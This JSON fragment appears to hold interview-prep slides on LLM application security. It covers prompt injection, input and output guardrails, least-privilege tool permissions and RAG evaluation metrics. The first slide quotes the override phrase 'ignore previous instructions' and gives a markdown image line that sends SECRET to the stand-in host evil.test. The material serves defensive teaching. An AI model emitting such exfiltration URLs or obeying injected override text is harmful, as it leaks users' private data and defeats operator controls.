    {
      "title": "Prompt Injection: The Threat Model",
      "role": "outline",
      "outlineIndex": 0,
      "pages": [
        {
          "title": "Prompt Injection: The Threat Model",
          "blocks": [
            {
              "type": "heading",
              "text": "1. What It Is",
              "ink": "red"
            },
            {
              "type": "bullets",
              "items": [
                "==Prompt injection==: untrusted text read as **instructions**",
                "System prompt and user text share ==one token stream==",
                "{red:Jailbreak}: breaks the model's safety policy",
                "{blue:Injection}: hijacks the app's task or tools",
                "An ==app-security== problem, not only alignment"
              ],
              "style": "dot",
              "frame": "dashed",
              "ink": "red"
            },
            {
              "type": "heading",
              "text": "2. Direct vs Indirect",
              "ink": "blue"
            },
            {
              "type": "table",
              "headers": [
                "",
                "Direct",
                "Indirect"
              ],
              "rows": [
                [
                  "Source",
                  "User turn: `ignore previous instructions`",
                  "Web page, PDF, email, RAG chunk, tool result"
                ],
                [
                  "User sees it",
                  "Yes",
                  "{red:Never}"
                ],
                [
                  "Danger",
                  "Lower",
                  "==Higher=="
                ]
              ],
              "highlightRow": 2
            },
            {
              "type": "heading",
              "text": "3. Lethal Trifecta",
              "ink": "orange"
            },
            {
              "type": "diagram",
              "kind": "flow",
              "spec": {
                "nodes": [
                  {
                    "text": "Private data",
                    "ink": "blue"
                  },
                  {
                    "text": "Untrusted content",
                    "ink": "orange"
                  },
                  {
                    "text": "Exfil channel",
                    "ink": "purple"
                  },
                  {
                    "text": "Data leaks",
                    "ink": "red"
                  }
                ]
              }
            },
            {
              "type": "bullets",
              "items": [
                "Remove ==any one leg== and the chain breaks",
                "Exfil via **markdown image URL**: the client fetches it"
              ],
              "style": "dot"
            },
            {
              "type": "code",
              "lang": "markdown",
              "lines": [
                "![x](https://evil.test/?d=SECRET)"
              ],
              "note": "data rides in the query string"
            },
            {
              "type": "heading",
              "text": "4. Interview Point",
              "ink": "purple"
            },
            {
              "type": "bullets",
              "items": [
                "**Why not fix with a better prompt?** Instructions and data are one stream; no hard boundary",
                "**Indirect vs direct?** Hidden in fetched content; the user never sees it",
                "**Image exfil?** Injected text makes the app emit an image URL with secrets in the query"
              ],
              "style": "dot",
              "ink": "purple"
            }
          ]
        }
      ]
    },
    {
      "title": "Input and Output Guardrails",
      "role": "outline",
      "outlineIndex": 1,
      "pages": [
        {
          "title": "Input and Output Guardrails",
          "blocks": [
            {
              "type": "heading",
              "text": "1. Guard Both Sides",
              "ink": "green"
            },
            {
              "type": "diagram",
              "kind": "flow",
              "spec": {
                "nodes": [
                  {
                    "text": "Input guard",
                    "sub": "before model",
                    "ink": "green"
                  },
                  {
                    "text": "Model",
                    "ink": "blue"
                  },
                  {
                    "text": "Output guard",
                    "sub": "before user or tool",
                    "ink": "purple"
                  },
                  {
                    "text": "Block",
                    "sub": "safe fallback",
                    "ink": "red"
                  }
                ]
              }
            },
            {
              "type": "table",
              "headers": [
                "",
                "Input guard",
                "Output guard"
              ],
              "rows": [
                [
                  "Checks",
                  "length, PII redaction, injection classifier, topic allowlist, delimited untrusted text",
                  "schema, secret and PII scan, toxicity, URL and image allowlist, groundedness"
                ],
                [
                  "Role",
                  "reduces risk, ==never eliminates== it",
                  "==last line== before user or tool"
                ]
              ]
            },
            {
              "type": "heading",
              "text": "2. Rules vs Model Checks",
              "ink": "blue"
            },
            {
              "type": "table",
              "headers": [
                "",
                "Rules (regex, schema)",
                "Model guard"
              ],
              "rows": [
                [
                  "Cost",
                  "fast, cheap",
                  "latency, cost"
                ],
                [
                  "Strength",
                  "deterministic",
                  "generalises"
                ],
                [
                  "Weakness",
                  "brittle",
                  "false positives, can be injected"
                ]
              ],
              "highlightRow": 2
            },
            {
              "type": "heading",
              "text": "3. Pattern and Pitfalls",
              "ink": "orange"
            },
            {
              "type": "bullets",
              "items": [
                "Guard in, guard out, ==fail closed==",
                "On block: safe fallback, log the reason code",
                "Never retry blindly with the same input",
                "Cheap guards first, expensive only if needed, in parallel"
              ],
              "style": "check"
            },
            {
              "type": "callout",
              "style": "sticky",
              "title": "Blocklist alone",
              "text": "Keywords miss paraphrase and encoding. Layer classifiers, schema and output checks."
            },
            {
              "type": "bullets",
              "items": [
                "**Where?** Before and after the model: input is untrusted, output is the last line",
                "**False positives, latency?** Log reason codes, tune thresholds, run cheap guards first, in parallel"
              ],
              "style": "dot",
              "frame": "dashed",
              "ink": "orange"
            }
          ]
        }
      ]
    },
    {
      "title": "Tool Permissions and Least Privilege",
      "role": "outline",
      "outlineIndex": 2,
      "pages": [
        {
          "title": "Tool Permissions and Least Privilege",
          "blocks": [
            {
              "type": "heading",
              "text": "1. Untrusted caller",
              "ink": "red"
            },
            {
              "type": "bullets",
              "items": [
                "Model = ==untrusted caller==; authorize every call in code",
                "A prompt saying 'do not delete' is not a control",
                "A ==missing permission== is"
              ],
              "style": "dot"
            },
            {
              "type": "heading",
              "text": "2. Least privilege and tiers",
              "ink": "blue"
            },
            {
              "type": "table",
              "headers": [
                "Tier",
                "Tools",
                "Gate"
              ],
              "rows": [
                [
                  "Local read",
                  "search index, read file",
                  "{green:auto-run}"
                ],
                [
                  "Egress",
                  "fetch, browse",
                  "{orange:domain allowlist}"
                ],
                [
                  "Write",
                  "write, send, spend, delete",
                  "{red:human confirms exact args}"
                ]
              ]
            },
            {
              "type": "bullets",
              "items": [
                "Per-agent ==tool allowlist==, read-only creds, narrow scopes",
                "Short-lived ==per-user tokens==, not a shared admin key",
                "Arguments validated against a schema",
                "Rate limits and spend caps per session"
              ],
              "style": "check"
            },
            {
              "type": "heading",
              "text": "3. Isolate risk",
              "ink": "purple"
            },
            {
              "type": "diagram",
              "kind": "flow",
              "spec": {
                "nodes": [
                  {
                    "text": "Untrusted text",
                    "ink": "red"
                  },
                  {
                    "text": "Quarantined reader",
                    "sub": "no tools",
                    "ink": "orange"
                  },
                  {
                    "text": "Privileged actor",
                    "sub": "trusted input",
                    "ink": "green"
                  }
                ]
              }
            },
            {
              "type": "bullets",
              "items": [
                "Code and shell tools run in a ==sandbox==: no network, no secrets",
                "Untrusted content never triggers privileged tools in the same turn"
              ],
              "style": "dot"
            },
            {
              "type": "heading",
              "text": "4. Interview Point",
              "ink": "green"
            },
            {
              "type": "bullets",
              "items": [
                "**Email agent?** Reader has no send tool; send needs approval of exact recipient and body",
                "**Which leg?** Cut ==exfiltration==: read-only still leaves fetch and image URLs, so allowlist recipients and domains",
                "**Allowlist vs denylist?** Unknown tools are denied by default; a denylist misses new ones"
              ],
              "style": "dot"
            }
          ]
        }
      ]
    },
    {
      "title": "Evaluating RAG: Faithfulness and Relevance",
      "role": "outline",
      "outlineIndex": 3,
      "pages": [
        {
          "title": "Evaluating RAG: Faithfulness and Relevance",
          "blocks": [
            {
              "type": "heading",
              "text": "1. Score Each Stage",
              "ink": "blue"
            },
            {
              "type": "table",
              "headers": [
                "Stage",
                "Metric",
                "Asks"
              ],
              "rows": [
                [
                  "Retrieval",
                  "==context precision==",
                  "Chunks relevant and ranked high?"
                ],
                [
                  "Retrieval",
                  "==context recall==",
                  "Everything needed fetched?"
                ],
                [
                  "Retrieval",
                  "hit rate, recall@k, MRR",
                  "Scored on labelled queries"
                ],
                [
                  "Generation",
                  "==faithfulness==",
                  "Claims supported by context?"
                ],
                [
                  "Generation",
                  "==answer relevance==",
                  "Answers the question asked?"
                ]
              ]
            },
            {
              "type": "heading",
              "text": "2. Faithfulness vs Relevance",
              "ink": "purple"
            },
            {
              "type": "diagram",
              "kind": "flow",
              "spec": {
                "nodes": [
                  {
                    "text": "Answer",
                    "ink": "blue"
                  },
                  {
                    "text": "Split claims",
                    "sub": "one fact each",
                    "ink": "purple"
                  },
                  {
                    "text": "Check each",
                    "sub": "against context",
                    "ink": "orange"
                  },
                  {
                    "text": "Score",
                    "sub": "supported / total",
                    "ink": "green"
                  }
                ]
              }
            },
            {
              "type": "bullets",
              "items": [
                "==Faithfulness==: answer vs context, catches **hallucination**",
                "==Relevance==: answer vs question",
                "{red:Faithful but irrelevant}: a true quote that does not answer"
              ],
              "style": "dot"
            },
            {
              "type": "heading",
              "text": "3. Golden Set and Judge",
              "ink": "green"
            },
            {
              "type": "bullets",
              "items": [
                "50-200 real questions + reference answers + source chunks",
                "LLM-as-judge with a rubric (RAGAS, TruLens, DeepEval)",
                "Spot-check the judge against human labels",
                "Run on every prompt, chunking or model change: ==regression gate=="
              ],
              "style": "check",
              "frame": "dashed",
              "ink": "green"
            },
            {
              "type": "heading",
              "text": "4. Interview Point",
              "ink": "orange"
            },
            {
              "type": "bullets",
              "items": [
                "**Fluent but wrong?** Low context recall = retrieval failed; good context but low faithfulness = generation failed",
                "**Faithful but off-topic?** Low answer relevance",
                "**Judge risk?** Self-preference and verbosity bias; it can drift from human labels"
              ],
              "style": "dot"
            }
          ]
        }
      ]
    },
